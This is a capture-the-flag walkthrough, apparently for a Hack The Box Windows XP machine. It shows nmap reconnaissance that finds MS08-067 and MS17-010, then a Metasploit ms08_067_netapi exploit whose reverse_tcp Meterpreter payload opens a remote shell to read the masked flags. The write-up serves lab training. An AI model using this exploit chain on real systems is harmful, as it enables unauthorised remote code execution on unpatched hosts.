![image](https://user-images.githubusercontent.com/105310322/187503726-6d16991e-f45d-40c5-a396-2e2447591df1.png)

### Tools: Nmap, msfexploit

Running nmap we can see that port 445 is open so lets try connecting.

```console
sudo nmap -sC -sV -O -A 10.129.80.140
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 22:43 BST
Nmap scan report for 10.129.80.140
Host is up (0.0067s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/3%OT=135%CT=1%CU=38136%PV=Y%DS=2%DC=T%G=Y%TM=62EAEC3
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=
OS:0)OPS(O1=M539NW0NNT00NNS%O2=M539NW0NNT00NNS%O3=M539NW0NNT00%O4=M539NW0NN
OS:T00NNS%O5=M539NW0NNT00NNS%O6=M539NNT00NNS)WIN(W1=FAF0%W2=FAF0%W3=FAF0%W4
OS:=FAF0%W5=FAF0%W6=FAF0)ECN(R=Y%DF=Y%T=80%W=FAF0%O=M539NW0NNS%CC=N%Q=)T1(R
OS:=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=N%T=80%W=0%S=Z%A=S%F=AR%O=%
OS:RD=0%Q=)T3(R=Y%DF=Y%T=80%W=FAF0%S=O%A=S+%F=AS%O=M539NW0NNT00NNS%RD=0%Q=)
OS:T4(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=80%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=
OS:N%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=B0%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:7c:45 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2022-08-09T02:41:57+03:00

TRACEROUTE (using port 1720/tcp)
HOP RTT     ADDRESS
1   4.73 ms 10.10.14.1
2   5.58 ms 10.129.80.140

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.20 seconds
```
Runnning smbclient didnt work for me so next we will see if there are any exploits its vulnerable to.

```console
smbclient -N -L //10.129.80.140
protocol negotiation failed: NT_STATUS_IO_TIMEOUT
```

Nmap gives us back 2 possible vulnerabilities. MS08_067 and MS17_010

```console
nmap -v -script smb-vuln* -p 139,445 10.129.80.140
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 22:48 BST
NSE: Loaded 11 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 22:48
Completed NSE at 22:48, 0.00s elapsed
Initiating Ping Scan at 22:48
Scanning 10.129.80.140 [2 ports]
Completed Ping Scan at 22:48, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:48
Completed Parallel DNS resolution of 1 host. at 22:48, 0.01s elapsed
Initiating Connect Scan at 22:48
Scanning 10.129.80.140 [2 ports]
Discovered open port 445/tcp on 10.129.80.140
Discovered open port 139/tcp on 10.129.80.140
Completed Connect Scan at 22:48, 0.01s elapsed (2 total ports)
NSE: Script scanning 10.129.80.140.
Initiating NSE at 22:48
Completed NSE at 22:48, 5.92s elapsed
Nmap scan report for 10.129.80.140
Host is up (0.018s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250

NSE: Script Post-scanning.
Initiating NSE at 22:48
Completed NSE at 22:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

Great now lets try to run it with msfexploit.

A quick search through metasploit gets us the exploit and we can set it up and execute it as follows. I ran into a problem the first time a ran this and my shell died in under a minute, after that I was unable to respawn it until I killed the docker instance and started it back from scratch.

```console
msf6 exploit(windows/smb/ms08_067_netapi) > options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.10.125.6     yes       The target host(s), see https://github.
                                       com/rapid7/metasploit-framework/wiki/Us
                                       ing-Metasploit
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thr
                                        ead, process, none)
   LHOST     165.227.92.79    yes       The listen address (an interface may b
                                        e specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting

msf6 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.129.160.6
rhosts => 10.129.160.6
msf6 exploit(windows/smb/ms08_067_netapi) > set lhost 10.10.14.93
lhost => 10.10.14.93
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.93:4444 
[*] 10.129.160.6:445 - Automatically detecting the target...
[*] 10.129.160.6:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.160.6:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.160.6:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.129.160.6
[*] Meterpreter session 1 opened (10.10.14.93:4444 -> 10.129.160.6:1036 ) at 2022-08-03 21:40:38 +0100
```

Awesome now we are in and we can navigate to the root and user flags!

```console
meterpreter > ls
Listing: C:\Documents and Settings\john\Desktop
===============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 06:19:49 +0000  user.txt

meterpreter > cat user.txt
e69a****************************
```

```console
meterpreter > ls
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 06:18:50 +0000  root.txt

meterpreter > cat root.txt 
9934****************************
```

GG!
